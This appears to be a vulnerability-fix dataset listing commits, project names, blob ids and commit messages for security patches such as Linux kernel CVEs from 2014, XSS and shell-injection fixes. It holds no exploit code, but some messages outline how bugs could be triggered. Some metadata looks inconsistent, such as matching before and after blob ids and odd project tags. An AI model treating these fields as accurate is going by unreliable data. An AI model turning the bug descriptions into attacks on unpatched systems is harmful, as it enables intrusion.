Blob(s) In Commit: 
    4a7d8ddb0bf3fc40b5f9dc5af463c4ea210db87e
Blob(s) Before Fix: 
    4a7d8ddb0bf3fc40b5f9dc5af463c4ea210db87e
Projects:
    5hadowblad3_file
Commit Message for ef2329cf71acb59204dd981e2c6cce6c81fe467c:
limit to 100 repetitions to avoid excessive backtracking Carsten Wolff

======================================================================
Commit With Fix: 
    d558023207e008a4476a3b7bb8706b2a2bf5d84f
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    63135331cec27b3801375835165726077f61cc35
Blob(s) Before Fix: 
    63135331cec27b3801375835165726077f61cc35
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d558023207e008a4476a3b7bb8706b2a2bf5d84f:
aio: prevent double free in ioctx_alloc\n\nioctx_alloc() calls aio_setup_ring() to allocate a ring. If aio_setup_ring() fails to do so it would call aio_free_ring() before returning, but ioctx_alloc() would call aio_free_ring() again causing a double free of the ring.\n\nThis is easily reproducible from userspace.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Benjamin LaHaise <bcrl@kvack.org>

======================================================================
Commit With Fix: 
    53da201749f8f362323ef278bf338f1d9f7a925a
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    884b2afd9529a55ee98fba6044c32d6f7314b9b2
Blob(s) Before Fix: 
    884b2afd9529a55ee98fba6044c32d6f7314b9b2
Projects:
    ArthurHoaro_Shaarli
Commit Message for 53da201749f8f362323ef278bf338f1d9f7a925a:
XSS flaw correction\n\nCloses issue https://github.com/sebsauvage/Shaarli/issues/134

======================================================================
Commit With Fix: 
    9e427d524e04a905312a3294c85e939ed7d57b8c
File(s) In Commit: 
    lib/api.js
Blob(s) In Commit: 
    b56578e7417c2944227b17b7945e273d56e03cc9
Blob(s) Before Fix: 
    b56578e7417c2944227b17b7945e273d56e03cc9
Projects:
    leizongmin_tomato
Commit Message for 9e427d524e04a905312a3294c85e939ed7d57b8c:
API服务器，检查 config.api.access_key 的类型，避免因误将其设置为字符串时导致验证被绕过

======================================================================
Commit With Fix: 
    dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448
File(s) In Commit: 
    lib/libnotify.js
Blob(s) In Commit: 
    7e59267d70b1ada34fc72b84a01dafede1a21f08
Blob(s) Before Fix: 
    7e59267d70b1ada34fc72b84a01dafede1a21f08
Projects:
    mytrile_node-libnotify
Commit Message for dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448:
Merge pull request #4 from nealpoole/exec-fix\n\nReplacing call to exec with execFile.

======================================================================
Commit With Fix: 
    2817869f98c54975f31e2dd674c1aefa70749cca
File(s) In Commit: 
    canto_curses/guibase.py
Blob(s) In Commit: 
    a67fc7dd52c039fbd3a0016203a393d018ac2ea1
Blob(s) Before Fix: 
    a67fc7dd52c039fbd3a0016203a393d018ac2ea1
Projects:
    stpx_canto-curses
Commit Message for 2817869f98c54975f31e2dd674c1aefa70749cca:
Proper URL quoting to avoid shell injection

======================================================================
Commit With Fix: 
    ad941faddead705cd611921730054767a0b32dcd
File(s) In Commit: 
    include/webutil.js
Blob(s) In Commit: 
    5ceccbefd33bc919024c1b74303fe874248078ef
Blob(s) Before Fix: 
    5ceccbefd33bc919024c1b74303fe874248078ef
Projects:
    0-complexity_noVNC
Commit Message for ad941faddead705cd611921730054767a0b32dcd:
Adds support for secure attribute on token cookie\n\nThis patch adds support for the secure attribute on token cookies (sent by nova-novncproxy). If the https is used to transfer the cookie, the secure attribute is set thus restricting server requestes to secure conections only. This should prevent man-in-the-middle attacks.

======================================================================
Commit With Fix: 
    741495cb08503fd32a9d22648e63b64390c601f4
File(s) In Commit: 
    nbd-server.c
Blob(s) In Commit: 
    bfc6790e9caa2c02a09a2c231648f2a2e5d1f6f3
Blob(s) Before Fix: 
    bfc6790e9caa2c02a09a2c231648f2a2e5d1f6f3
Projects:
    363921219_nbd
Commit Message for 741495cb08503fd32a9d22648e63b64390c601f4:
nbd-server: handle modern-style negotiation in a child process\n\nPreviously, the modern style negotiation was carried out in the root server (listener) process before forking the actual client handler. This made it possible for a malfunctioning or evil client to terminate the root process simply by querying a non-existent export or aborting in the middle of the negotation process (caused SIGPIPE in the server).\n\nThis commit moves the negotiation process to the child to keep the root process up and running no matter what happens during the negotiation.\n\nSee http://sourceforge.net/mailarchive/message.php?msg_id=30410146\n\nSigned-off-by: Tuomas Räsänen <tuomasjjrasanen@tjjr.fi>

======================================================================
Commit With Fix: 
    dc2966bd05b69321300c63fd0bd78e7c78ecea6e
File(s) In Commit: 
    includes/specials/SpecialContributions.php
Blob(s) In Commit: 
    614bd3ec419f2f250154e443376a97efb99b84cb
Blob(s) Before Fix: 
    614bd3ec419f2f250154e443376a97efb99b84cb
Projects:
    0x047d_mediawiki
Commit Message for dc2966bd05b69321300c63fd0bd78e7c78ecea6e:
Prevent Special:Contributions from indicating that an IP address is autoblocked\n\nIf an IP address was autoblocked in the userlinks, sysops would see "change block" and "unblock", indicating that the IP is autoblocked.\n\nNow Special:Contributions will only display "change block" if the user is blocked and the block type is not Block::TYPE_AUTO. This is the same check which is used above when deciding whether to display the block log extract.\n\nBug: 46457 Change-Id: I43047059cb67527d5296322ac17fe798db917bec

======================================================================
Commit With Fix: 
    2def2ef2ae5f3990aabdbe8a755911902707d268
File(s) In Commit: 
    net/compat.c
Blob(s) In Commit: 
    f50161fb812eace2eb659ae78bf12062c608b5b6
Blob(s) Before Fix: 
    f50161fb812eace2eb659ae78bf12062c608b5b6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2def2ef2ae5f3990aabdbe8a755911902707d268:
x86, x32: Correct invalid use of user timespec in the kernel\n\nThe x32 case for the recvmsg() timout handling is broken:\n\n  asmlinkage long compat_sys_recvmmsg(int fd, struct compat_mmsghdr __user *mmsg,                                       unsigned int vlen, unsigned int flags,                                       struct compat_timespec __user *timeout)   {           int datagrams            struct timespec ktspec \n\n          if (flags & MSG_CMSG_COMPAT)                   return -EINVAL \n\n          if (COMPAT_USE_64BIT_TIME)                   return __sys_recvmmsg(fd, (struct mmsghdr __user *)mmsg, vlen,                                         flags | MSG_CMSG_COMPAT,                                         (struct timespec *) timeout)            ...\n\nThe timeout pointer parameter is provided by userland (hence the __user annotation) but for x32 syscalls it's simply cast to a kernel pointer and is passed to __sys_recvmmsg which will eventually directly dereference it for both reading and writing.  Other callers to __sys_recvmmsg properly copy from userland to the kernel first.\n\nThe bug was introduced by commit ee4fa23c4bfc ("compat: Use COMPAT_USE_64BIT_TIME in net/compat.c") and should affect all kernels since 3.4 (and perhaps vendor kernels if they backported x32 support along with this code).\n\nNote that CONFIG_X86_X32_ABI gets enabled at build time and only if CONFIG_X86_X32 is enabled and ld can build x32 executables.\n\nOther uses of COMPAT_USE_64BIT_TIME seem fine.\n\nThis addresses CVE-2014-0038.\n\nSigned-off-by: PaX Team <pageexec@freemail.hu> Signed-off-by: H. Peter Anvin <hpa@linux.intel.com> Cc: <stable@vger.kernel.org> # v3.4+ Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    a08d3b3b99efd509133946056531cdf8f3a0c09b
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    2b8578432d5bccd296fa6d5859e3575c0fe4aa02
Blob(s) Before Fix: 
    2b8578432d5bccd296fa6d5859e3575c0fe4aa02
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a08d3b3b99efd509133946056531cdf8f3a0c09b:
kvm: x86: fix emulator buffer overflow (CVE-2014-0049)\n\nThe problem occurs when the guest performs a pusha with the stack address pointing to an mmio address (or an invalid guest physical address) to start with, but then extending into an ordinary guest physical address.  When doing repeated emulated pushes emulator_read_write sets mmio_needed to 1 on the first one.  On a later push when the stack points to regular memory, mmio_nr_fragments is set to 0, but mmio_is_needed is not set to 0.\n\nAs a result, KVM exits to userspace, and then returns to complete_emulated_mmio.  In complete_emulated_mmio vcpu->mmio_cur_fragment is incremented.  The termination condition of vcpu->mmio_cur_fragment == vcpu->mmio_nr_fragments is never achieved. The code bounces back and fourth to userspace incrementing mmio_cur_fragment past it's buffer.  If the guest does nothing else it eventually leads to a a crash on a memcpy from invalid memory address.\n\nHowever if a guest code can cause the vm to be destroyed in another vcpu with excellent timing, then kvm_clear_async_pf_completion_queue can be used by the guest to control the data that's pointed to by the call to cancel_work_item, which can be used to gain execution.\n\nFixes: f78146b0f9230765c6315b2e14f56112513389ad Signed-off-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org (3.5+) Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    5d81de8e8667da7135d3a32a964087c0faf5483f
File(s) In Commit: 
    fs/cifs/file.c
Blob(s) In Commit: 
    18758bcd4dab47d7b7d4c0fd8d6465cf78128048
Blob(s) Before Fix: 
    18758bcd4dab47d7b7d4c0fd8d6465cf78128048
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 5d81de8e8667da7135d3a32a964087c0faf5483f:
cifs: ensure that uncached writes handle unmapped areas correctly\n\nIt's possible for userland to pass down an iovec via writev() that has a bogus user pointer in it. If that happens and we're doing an uncached write, then we can end up getting less bytes than we expect from the call to iov_iter_copy_from_user. This is CVE-2014-0069\n\ncifs_iovec_write isn't set up to handle that situation however. It'll blindly keep chugging through the page array and not filling those pages with anything useful. Worse yet, we'll later end up with a negative number in wdata->tailsz, which will confuse the sending routines and cause an oops at the very least.\n\nFix this by having the copy phase of cifs_iovec_write stop copying data in this situation and send the last write as a short one. At the same time, we want to avoid sending a zero-length write to the server, so break out of the loop and set rc to -EFAULT if that happens. This also allows us to handle the case where no address in the iovec is valid.\n\n[Note: Marking this for stable on v3.4+ kernels, but kernels as old as        v2.6.38 may have a similar problem and may need similar fix]\n\nCc: <stable@vger.kernel.org> # v3.4+ Reviewed-by: Pavel Shilovsky <piastry@etersoft.ru> Reported-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>

======================================================================
Commit With Fix: 
    a1d6fc07e8a40c1b2b16f4103c403b30e1089668
File(s) In Commit: 
    src/ios/CDVFileTransfer.m
Blob(s) In Commit: 
    c5c75028c222d3314a0e3c87ec251de635ad636e
Blob(s) Before Fix: 
    c5c75028c222d3314a0e3c87ec251de635ad636e
Projects:
    471685249_cordova-plugin-file-transfer
Commit Message for a1d6fc07e8a40c1b2b16f4103c403b30e1089668:
Fix default value for trustAllHosts on iOS (YES->NO)

======================================================================
Commit With Fix: 
    d8316f3991d207fe32881a9ac20241be8fa2bad0
File(s) In Commit: 
    drivers/vhost/net.c
Blob(s) In Commit: 
    026be580d318481f6ed3732dd06b6fb2ea2c5160
Blob(s) Before Fix: 
    026be580d318481f6ed3732dd06b6fb2ea2c5160
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d8316f3991d207fe32881a9ac20241be8fa2bad0:
vhost: fix total length when packets are too short\n\nWhen mergeable buffers are disabled, and the incoming packet is too large for the rx buffer, get_rx_bufs returns success.\n\nThis was intentional in order for make recvmsg truncate the packet and then handle_rx would detect err != sock_len and drop it.\n\nUnfortunately we pass the original sock_len to recvmsg - which means we use parts of iov not fully validated.\n\nFix this up by detecting this overrun and doing packet drop immediately.\n\nCVE-2014-0077\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b412ca05f6b430eaa1ce97ac95885b4cf187b04a
File(s) In Commit: 
    lib/net/ldap/password.rb
Blob(s) In Commit: 
    729e17e31b4163c7d96c715ba8455ad924f19238
Blob(s) Before Fix: 
    729e17e31b4163c7d96c715ba8455ad924f19238
Projects:
    0xCCD_ruby-net-ldap
Commit Message for b412ca05f6b430eaa1ce97ac95885b4cf187b04a:
Use SecureRandam to generate salt

======================================================================
Commit With Fix: 
    8131f15003f5bec73d475d2b724472e4b87d0757
File(s) In Commit: 
    impl/src/main/java/org/richfaces/webapp/PushHandlerFilter.java
Blob(s) In Commit: 
    8b88e3b652ca5c1ff071d9249d930db19d05f808
Blob(s) Before Fix: 
    8b88e3b652ca5c1ff071d9249d930db19d05f808
Projects:
    Alvise88_richfaces
Commit Message for 8131f15003f5bec73d475d2b724472e4b87d0757:
RF-13250: applying patch

======================================================================
Commit With Fix: 
    ec0223ec48a90cb605244b45f7c62de856403729
File(s) In Commit: 
    net/sctp/sm_statefuns.c
Blob(s) In Commit: 
    ae65b6b5973a9bceca7825037317f9fc9f39e2db
Blob(s) Before Fix: 
    ae65b6b5973a9bceca7825037317f9fc9f39e2db
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ec0223ec48a90cb605244b45f7c62de856403729:
net: sctp: fix sctp_sf_do_5_1D_ce to verify if we/peer is AUTH capable\n\nRFC4895 introduced AUTH chunks for SCTP  during the SCTP handshake RANDOM  CHUNKS  HMAC-ALGO are negotiated (CHUNKS being optional though):\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   -------------------- COOKIE-ECHO -------------------->   <-------------------- COOKIE-ACK ---------------------\n\nA special case is when an endpoint requires COOKIE-ECHO chunks to be authenticated:\n\n  ---------- INIT[RANDOM  CHUNKS  HMAC-ALGO] ---------->   <------- INIT-ACK[RANDOM  CHUNKS  HMAC-ALGO] ---------   ------------------ AUTH  COOKIE-ECHO ---------------->   <-------------------- COOKIE-ACK ---------------------\n\nRFC4895, section 6.3. Receiving Authenticated Chunks says:\n\n  The receiver MUST use the HMAC algorithm indicated in   the HMAC Identifier field. If this algorithm was not   specified by the receiver in the HMAC-ALGO parameter in   the INIT or INIT-ACK chunk during association setup, the   AUTH chunk and all the chunks after it MUST be discarded   and an ERROR chunk SHOULD be sent with the error cause   defined in Section 4.1. [...] If no endpoint pair shared   key has been configured for that Shared Key Identifier,   all authenticated chunks MUST be silently discarded. [...]\n\n  When an endpoint requires COOKIE-ECHO chunks to be   authenticated, some special procedures have to be followed   because the reception of a COOKIE-ECHO chunk might result   in the creation of an SCTP association. If a packet arrives   containing an AUTH chunk as a first chunk, a COOKIE-ECHO   chunk as the second chunk, and possibly more chunks after   them, and the receiver does not have an STCB for that   packet, then authentication is based on the contents of   the COOKIE-ECHO chunk. In this situation, the receiver MUST   authenticate the chunks in the packet by using the RANDOM   parameters, CHUNKS parameters and HMAC_ALGO parameters   obtained from the COOKIE-ECHO chunk, and possibly a local   shared secret as inputs to the authentication procedure   specified in Section 6.3. If authentication fails, then   the packet is discarded. If the authentication is successful,   the COOKIE-ECHO and all the chunks after the COOKIE-ECHO   MUST be processed. If the receiver has an STCB, it MUST   process the AUTH chunk as described above using the STCB   from the existing association to authenticate the   COOKIE-ECHO chunk and all the chunks after it. [...]\n\nCommit bbd0d59809f9 introduced the possibility to receive and verification of AUTH chunk, including the edge case for authenticated COOKIE-ECHO. On reception of COOKIE-ECHO, the function sctp_sf_do_5_1D_ce() handles processing, unpacks and creates a new association if it passed sanity checks and also tests for authentication chunks being present. After a new association has been processed, it invokes sctp_process_init() on the new association and walks through the parameter list it received from the INIT chunk. It checks SCTP_PARAM_RANDOM, SCTP_PARAM_HMAC_ALGO and SCTP_PARAM_CHUNKS, and copies them into asoc->peer meta data (peer_random, peer_hmacs, peer_chunks) in case sysctl -w net.sctp.auth_enable=1 is set. If in INIT's SCTP_PARAM_SUPPORTED_EXT parameter SCTP_CID_AUTH is set, peer_random != NULL and peer_hmacs != NULL the peer is to be assumed asoc->peer.auth_capable=1, in any other case asoc->peer.auth_capable=0.\n\nNow, if in sctp_sf_do_5_1D_ce() chunk->auth_chunk is available, we set up a fake auth chunk and pass that on to sctp_sf_authenticate(), which at latest in sctp_auth_calculate_hmac() reliably dereferences a NULL pointer at position 0..0008 when setting up the crypto key in crypto_hash_setkey() by using asoc->asoc_shared_key that is NULL as condition key_id == asoc->active_key_id is true if the AUTH chunk was injected correctly from remote. This happens no matter what net.sctp.auth_enable sysctl says.\n\nThe fix is to check for net->sctp.auth_enable and for asoc->peer.auth_capable before doing any operations like sctp_sf_authenticate() as no key is activated in sctp_auth_asoc_init_active_key() for each case.\n\nNow as RFC4895 section 6.3 states that if the used HMAC-ALGO passed from the INIT chunk was not used in the AUTH chunk, we SHOULD send an error  however in this case it would be better to just silently discard such a maliciously prepared handshake as we didn't even receive a parameter at all. Also, as our endpoint has no shared key configured, section 6.3 says that MUST silently discard, which we are doing from now onwards.\n\nBefore calling sctp_sf_pdiscard(), we need not only to free the association, but also the chunk->auth_chunk skb, as commit bbd0d59809f9 created a skb clone in that case.\n\nI have tested this locally by using netfilter's nfqueue and re-injecting packets into the local stack after maliciously modifying the INIT chunk (removing RANDOM  HMAC-ALGO param) and the SCTP packet containing the COOKIE_ECHO (injecting AUTH chunk before COOKIE_ECHO). Fixed with this patch applied.\n\nFixes: bbd0d59809f9 ("[SCTP]: Implement the receive and verification of AUTH chunk") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Vlad Yasevich <yasevich@gmail.com> Cc: Neil Horman <nhorman@tuxdriver.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    1fd819ecb90cc9b822cd84d3056ddba315d3340f
File(s) In Commit: 
    net/core/skbuff.c
Blob(s) In Commit: 
    869c7afe3b070576464693e4d6ca00482c151f42
Blob(s) Before Fix: 
    869c7afe3b070576464693e4d6ca00482c151f42
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1fd819ecb90cc9b822cd84d3056ddba315d3340f:
skbuff: skb_segment: orphan frags before copying\n\nskb_segment copies frags around, so we need to copy them carefully to avoid accessing user memory after reporting completion to userspace through a callback.\n\nskb_segment doesn't normally happen on datapath: TSO needs to be disabled - so disabling zero copy in this case does not look like a big deal.\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com> Acked-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4291086b1f081b869c6d79e5b7441633dc3ace00
File(s) In Commit: 
    drivers/tty/n_tty.c
Blob(s) In Commit: 
    fe9d129c87351b47392320a626dedb89e2f0bf55
Blob(s) Before Fix: 
    fe9d129c87351b47392320a626dedb89e2f0bf55
Projects:
    0-T-0_ps4-linux
Commit Message for 4291086b1f081b869c6d79e5b7441633dc3ace00:
n_tty: Fix n_tty_write crash when echoing in raw mode\n\nThe tty atomic_write_lock does not provide an exclusion guarantee for the tty driver if the termios settings are LECHO & !OPOST.  And since it is unexpected and not allowed to call TTY buffer helpers like tty_insert_flip_string concurrently, this may lead to crashes when concurrect writers call pty_write. In that case the following two writers: * the ECHOing from a workqueue and * pty_write from the process race and can overflow the corresponding TTY buffer like follows.\n\nIf we look into tty_insert_flip_string_fixed_flag, there is:   int space = __tty_buffer_request_room(port, goal, flags)    struct tty_buffer *tb = port->buf.tail    ...   memcpy(char_buf_ptr(tb, tb->used), chars, space)    ...   tb->used += space \n\nso the race of the two can result in something like this:               A                                B __tty_buffer_request_room                                   __tty_buffer_request_room memcpy(buf(tb->used), ...) tb->used += space                                    memcpy(buf(tb->used), ...) ->BOOM\n\nB's memcpy is past the tty_buffer due to the previous A's tb->used increment.\n\nSince the N_TTY line discipline input processing can output concurrently with a tty write, obtain the N_TTY ldisc output_lock to serialize echo output with normal tty writes.  This ensures the tty buffer helper tty_insert_flip_string is not called concurrently and everything is fine.\n\nNote that this is nicely reproducible by an ordinary user using forkpty and some setup around that (raw termios + ECHO). And it is present in kernels at least after commit d945cb9cce20ac7143c2de8d88b187f62db99bdc (pty: Rework the pty layer to use the normal buffering logic) in 2.6.31-rc3.\n\njs: add more info to the commit log js: switch to bool js: lock unconditionally js: lock only the tty->ops->write call\n\nReferences: CVE-2014-0196 Reported-and-tested-by: Jiri Slaby <jslaby@suse.cz> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Jiri Slaby <jslaby@suse.cz> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Alan Cox <alan@lxorguk.ukuu.org.uk> Cc: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    7ada876a8703f23befbb20a7465a702ee39b1704
File(s) In Commit: 
    kernel/futex.c
Blob(s) In Commit: 
    e328f574c97c02797d7ff06c5cb5862f9368ce4a
Blob(s) Before Fix: 
    e328f574c97c02797d7ff06c5cb5862f9368ce4a
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 7ada876a8703f23befbb20a7465a702ee39b1704:
futex: Fix errors in nested key ref-counting\n\nfutex_wait() is leaking key references due to futex_wait_setup() acquiring an additional reference via the queue_lock() routine. The nested key ref-counting has been masking bugs and complicating code analysis. queue_lock() is only called with a previously ref-counted key, so remove the additional ref-counting from the queue_(un)lock() functions.\n\nAlso futex_wait_requeue_pi() drops one key reference too many in unqueue_me_pi(). Remove the key reference handling from unqueue_me_pi(). This was paired with a queue_lock() in futex_lock_pi(), so the count remains unchanged.\n\nDocument remaining nested key ref-counting sites.\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com> Reported-and-tested-by: Matthieu Fertré<matthieu.fertre@kerlabs.com> Reported-by: Louis Rilling<louis.rilling@kerlabs.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Eric Dumazet <eric.dumazet@gmail.com> Cc: John Kacur <jkacur@redhat.com> Cc: Rusty Russell <rusty@rustcorp.com.au> LKML-Reference: <4CBB17A8.70401@linux.intel.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: stable@kernel.org

======================================================================
Commit With Fix: 
    edfbbf388f293d70bf4b7c0bc38774d05e6f711a
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    955947ef3e0263590b64162f5888b81822196415
Blob(s) Before Fix: 
    955947ef3e0263590b64162f5888b81822196415
Projects:
    0-T-0_ps4-linux
Commit Message for edfbbf388f293d70bf4b7c0bc38774d05e6f711a:
aio: fix kernel memory disclosure in io_getevents() introduced in v3.10\n\nA kernel memory disclosure was introduced in aio_read_events_ring() in v3.10 by commit a31ad380bed817aa25f8830ad23e1a0480fef797.  The changes made to aio_read_events_ring() failed to correctly limit the index into ctx->ring_pages[], allowing an attacked to cause the subsequent kmap() of an arbitrary page with a copy_to_user() to copy the contents into userspace. This vulnerability has been assigned CVE-2014-0206.  Thanks to Mateusz and Petr for disclosing this issue.\n\nThis patch applies to v3.12+.  A separate backport is needed for 3.10/3.11.\n\nSigned-off-by: Benjamin LaHaise <bcrl@kvack.org> Cc: Mateusz Guzik <mguzik@redhat.com> Cc: Petr Matousek <pmatouse@redhat.com> Cc: Kent Overstreet <kmo@daterainc.com> Cc: Jeff Moyer <jmoyer@redhat.com> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    b8acc83781d5a24cc5101e525d15efe0482c280d
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    c591a14a9f9e7e2accfc2a0ebeb19d319e3570e6
Blob(s) Before Fix: 
    c591a14a9f9e7e2accfc2a0ebeb19d319e3570e6
Projects:
    5hadowblad3_file
Commit Message for b8acc83781d5a24cc5101e525d15efe0482c280d:
Remove loop that kept reading the same offset (Jan Kaluza)

======================================================================
Commit With Fix: 
    f97486ef5dc3e8735440edc4fc8808c63e1a3ef0
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    375406c3789e8154b5eec38efd3c3ad7492ed342
Blob(s) Before Fix: 
    375406c3789e8154b5eec38efd3c3ad7492ed342
Projects:
    5hadowblad3_file
Commit Message for f97486ef5dc3e8735440edc4fc8808c63e1a3ef0:
CVE-2014-0207: Prevent 0 element vectors and vectors longer than the number of properties from accessing random memory.

======================================================================
Commit With Fix: 
    83f8306117115729ac9346523762c0c396251eb5
File(s) In Commit: 
    lib/Email/Address.pm
Blob(s) In Commit: 
    1e0feb80f8284bac002e1541279cdbff4a8afeda
Blob(s) Before Fix: 
    1e0feb80f8284bac002e1541279cdbff4a8afeda
Projects:
    ruz_email-address
Commit Message for 83f8306117115729ac9346523762c0c396251eb5:
quoted part can be empty

======================================================================
Commit With Fix: 
    3ed749263abe3d69fa3626d142a5789dcb5a5684
File(s) In Commit: 
    src/lib/Libdis/disrsi_.c
Blob(s) In Commit: 
    154514c278628eeacd8a44ab06e1eb6e3c20165d
Blob(s) Before Fix: 
    154514c278628eeacd8a44ab06e1eb6e3c20165d
Projects:
    AlbertDeFusco_torque
Commit Message for 3ed749263abe3d69fa3626d142a5789dcb5a5684:
Merge pull request #171 into 2.5-fixes.

======================================================================
Commit With Fix: 
    7aaddf52cd98589fb0c3ab72a393f8411838438a
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    2efd203cce1bcffeed860100f15776f75ef8daef
Blob(s) Before Fix: 
    2efd203cce1bcffeed860100f15776f75ef8daef
Projects:
    Accacio_graphviz
Commit Message for 7aaddf52cd98589fb0c3ab72a393f8411838438a:
Fix buffer overflow problem when reporting a syntax error with a very long input line

======================================================================
Commit With Fix: 
    d266bb2b4154d11c27252b56d86963aef4434750
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    212967c709ac9a277222985e9f192e1a6c433984
Blob(s) Before Fix: 
    212967c709ac9a277222985e9f192e1a6c433984
Projects:
    Accacio_graphviz
Commit Message for d266bb2b4154d11c27252b56d86963aef4434750:
Prevent possible buffer overflow in yyerror()

======================================================================
Commit With Fix: 
    1d1bdec6318746f6f19f245db589eddc887ae8ff
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    d065b61fbaa7ab97fcb7fc573a3a2c5b27a2fadb
Blob(s) Before Fix: 
    d065b61fbaa7ab97fcb7fc573a3a2c5b27a2fadb
Projects:
    Accacio_graphviz
Commit Message for 1d1bdec6318746f6f19f245db589eddc887ae8ff:
Fix possible buffer overflow problem in chkNum of scanner.

======================================================================
Commit With Fix: 
    26bef1318adc1b3a530ecc807ef99346db2aa8b0
File(s) In Commit: 
    arch/x86/include/asm/fpu-internal.h
Blob(s) In Commit: 
    cea1c76d49bf5b04344bb17c353bab35869cf01a
Blob(s) Before Fix: 
    cea1c76d49bf5b04344bb17c353bab35869cf01a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 26bef1318adc1b3a530ecc807ef99346db2aa8b0:
x86, fpu, amd: Clear exceptions in AMD FXSAVE workaround\n\nBefore we do an EMMS in the AMD FXSAVE information leak workaround we need to clear any pending exceptions, otherwise we trap with a floating-point exception inside this code.\n\nReported-by: halfdog <me@halfdog.net> Tested-by: Borislav Petkov <bp@suse.de> Link: http://lkml.kernel.org/r/CA%2B55aFxQnY_PCG_n4=0w-VG=YLXL-yr7oMxyy0WU2gCBAf3ydg@mail.gmail.com Signed-off-by: H. Peter Anvin <hpa@zytor.com>

======================================================================
Commit With Fix: 
    96b340406724d87e4621284ebac5e059d67b2194
File(s) In Commit: 
    drivers/net/wan/farsync.c
Blob(s) In Commit: 
    bcfff0d62de4f2070d5ac644a3becfedb74e3462
Blob(s) Before Fix: 
    bcfff0d62de4f2070d5ac644a3becfedb74e3462
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 96b340406724d87e4621284ebac5e059d67b2194:
farsync: fix info leak in ioctl\n\nThe fst_get_iface() code fails to initialize the two padding bytes of struct sync_serial_settings after the ->loopback member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2b13d06c9584b4eb773f1e80bbaedab9a1c344e1
File(s) In Commit: 
    drivers/net/wan/wanxl.c
Blob(s) In Commit: 
    4c0a69779b8980a16ccca5a90acc5ece605cf06a
Blob(s) Before Fix: 
    4c0a69779b8980a16ccca5a90acc5ece605cf06a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2b13d06c9584b4eb773f1e80bbaedab9a1c344e1:
wanxl: fix info leak in ioctl\n\nThe wanxl_ioctl() code fails to initialize the two padding bytes of struct sync_serial_settings after the ->loopback member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    8e3fbf870481eb53b2d3a322d1fc395ad8b367ed
File(s) In Commit: 
    drivers/net/hamradio/yam.c
Blob(s) In Commit: 
    61dd2447e1bb4eedb5d8e6b72abcf21e9f273afb
Blob(s) Before Fix: 
    61dd2447e1bb4eedb5d8e6b72abcf21e9f273afb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8e3fbf870481eb53b2d3a322d1fc395ad8b367ed:
hamradio/yam: fix info leak in ioctl\n\nThe yam_ioctl() code fails to initialise the cmd field of the struct yamdrv_ioctl_cfg. Add an explicit memset(0) before filling the structure to avoid the 4-byte info leak.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6b81541fc1e5dd1c70614585c1a04d04ccdb3b19
File(s) In Commit: 
    setup/data/doorgets.zip
Blob(s) In Commit: 
    ba08c97d3281548decbed4617b01f92ab8b6f086
Blob(s) Before Fix: 
    ba08c97d3281548decbed4617b01f92ab8b6f086
Projects:
    Semapp_doorGets
Commit Message for 6b81541fc1e5dd1c70614585c1a04d04ccdb3b19:
